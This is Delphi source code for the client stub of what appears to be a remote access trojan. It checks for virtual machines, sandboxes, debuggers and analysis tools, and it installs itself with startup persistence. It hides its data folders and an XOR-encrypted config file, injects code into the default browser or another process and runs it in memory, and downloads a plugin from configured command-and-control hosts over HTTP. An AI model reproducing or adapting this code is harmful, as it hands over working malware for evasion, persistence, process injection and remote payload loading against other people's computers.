program Client;

{$IMAGEBASE 13140200}     
{$SETPEOPTFLAGS $010}

uses
  Windows, UnitConstants, UnitEncryption, UnitFunctions, UnitInjection, uDEP,
  UnitConfiguration, UnitInstallation, UnitProtection, UnitPlugins, UnitDownload;

type
  PConfig = ^TConfig;
  TConfig = record
    ClientPath, DatasPath, MutexName,
    PluginPath: array[0..MAX_PATH] of Char;
    Address: array[0..4] of TArray;
  end;

procedure DownloadPlugin(Config: PConfig); stdcall;
var
  MainMutex, h: Cardinal;
  i: Integer;
begin
  LoadLibrary('user32.dll');  
  LoadLibrary('urlmon.dll');
  LoadLibrary('advapi32.dll');
  LoadLibrary('shell32.dll');
  LoadLibrary('kernel32.dll');
        
  Sleep(1000);

  MainMutex := CreateMutex(nil, False, Config.MutexName);
  if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0);
                         
  Downloaded := False;
  PluginPath := Config.PluginPath;
  xClientPath := Config.ClientPath;
  for i := 0 to 4 do Address[i] := Config.Address[i];
  h := MyStartThread(@MyDownloadPlugin);
  while Downloaded = False do ProcessMessages;
end;

function MyGetProcessInfos(var PI: TProcessInformation): Boolean;
begin
  if _InjectInto = '%DEFAULTBROWSER%' then
    Result := MyCreateProcess(PChar(GetBrowser), '', PI)
  else

  if _InjectInto = '%NOINJECTION%' then
  begin
    ZeroMemory(@PI, SizeOf(PI));
    PI.hProcess := GetCurrentProcess;
    PI.hThread := GetCurrentThread;
    PI.dwProcessId := GetCurrentProcessId;
    PI.dwThreadId:= GetCurrentThreadId;
    Result := @PI <> nil;
  end
  else Result := MyCreateProcess(nil, PChar(_InjectInto), PI);
end;

var
  Config: TConfig;
  TmpMutex: THandle;
  TmpStr: string;
  PI: TProcessInformation;
  TmpBool: Boolean;
  i: Integer;
  p: Pointer;
begin
  NoErrMsg := True;
  SetErrorMode(SEM_FAILCRITICALERRORS or SEM_NOALIGNMENTFAULTEXCEPT or
    SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX);

  CheckConfiguration; //First of all!!
  CheckExecConditions(_AntiVM, _AntiSB, _AntiDG, _AntiPA);

  TmpMutex := CreateMutex(nil, False, 'PRClt_UPDATE');
  if GetLastError = ERROR_ALREADY_EXISTS then Sleep(6000);
  CloseHandle(TmpMutex);

  ClientPath := InstallClient;
  EnableStartup(ClientPath);

  DatasPath := ExtractFilePath(ClientPath) + _DatasPath;
  if not DirectoryExists(DatasPath) then
  begin
    CreateDirectory(PChar(DatasPath), nil);
    HideFileName(DatasPath);
  end;

  PluginsDir := DatasPath + '\plugs';
  if not DirectoryExists(PluginsDir) then
  begin
    CreateDirectory(PChar(PluginsDir), nil);
    HideFileName(PluginsDir);
  end;

  TmpStr := XorEnDecrypt(GenerateConfig);
  if not FileExists(DatasPath + '\cfg') then
  begin
    MyCreateFile(DatasPath + '\cfg', TmpStr, Length(TmpStr));
    HideFileName(DatasPath + '\cfg');
  end;

  ProcessExtras(ClientPath);
  MyStartThread(@LoadPlugins);

  i := 0;

  repeat
    TmpBool := MyGetProcessInfos(PI);
    if TmpBool = False then TerminateProcess(PI.hProcess, ExitCode);
    Inc(i);
  until (i >= 5) or (TmpBool = True);
  if (i >= 5) and (TmpBool = False) then ExitProcess(0);

  if FileExists(DatasPath + '\plg') then
  begin
    i := 0;
    repeat
      if _InjectInto <> '%NOINJECTION%' then
        TmpBool := RunInMemory(DatasPath + '\plg', PI)
      else
      begin
        MyCreateProcess(PChar(ParamStr(0)), '', PI);
        TmpBool := RunInMemory(DatasPath + '\plg', PI);
      end;

      if TmpBool = False then
      begin
        TerminateProcess(PI.hProcess, ExitCode);
        if not MyGetProcessInfos(PI) then ExitProcess(0);
      end;

      Inc(i);
    until (i >= 5) or (TmpBool = True);
    if (i >= 5) and (TmpBool = False) then ExitProcess(0);

    TmpStr := ClientPath + '|' + DatasPath;
    TmpStr := XorEnDecrypt(TmpStr);
    MyCreateFile(AppDataDir + IntToStr(PI.dwProcessId), TmpStr, Length(TmpStr));
    HideFileName(AppDataDir + IntToStr(PI.dwProcessId));
  end
  else      
  begin
    TmpStr := DatasPath + '\plg';
    CopyMemory(@Config.PluginPath, @TmpStr[1], Length(TmpStr));

    TmpStr := _MutexName + '_CLIENT';
    CopyMemory(@Config.MutexName, @TmpStr[1], Length(TmpStr));

    CopyMemory(@Config.ClientPath, @ClientPath[1], Length(ClientPath));
    CopyMemory(@Config.DatasPath, @DatasPath[1], Length(DatasPath));

    if _PluginUrl <> '' then
    begin
      TmpStr := _PluginUrl;
      Config.Address[0] := StrToArray(TmpStr);
      for i := 1 to 4 do Config.Address[i] := StrToArray('');
    end
    else
    begin
      for i := 0 to 4 do
      begin
        TmpStr := '';
        if (_Hosts[i] = '') or (_Ports[i] = 0) then Continue;
        TmpStr := 'http://' + _Hosts[i] + ':' + IntToStr(_Ports[i]) + '/lmr';
        if TmpStr <> '' then Config.Address[i] := StrToArray(TmpStr);
      end;
    end;

    i := 0;
    p := nil;

    repeat
      p := _RunInMemory(@DownloadPlugin, @Config, PI);
      if p = nil then
      begin
        TerminateProcess(PI.hProcess, ExitCode);
        if not MyGetProcessInfos(PI) then ExitProcess(0);
      end;

      TmpMutex := CreateMutex(nil, False, PChar(_MutexName + '_CLIENT'));
      TmpBool := GetLastError = ERROR_ALREADY_EXISTS;
      CloseHandle(TmpMutex);
      
      Inc(i);
    until (i >= 5) or (TmpBool = True);
    if (i >= 5) and (TmpBool = False) then ExitProcess(0);
  end;

  while LoadingPlugins do ProcessMessages;
end.
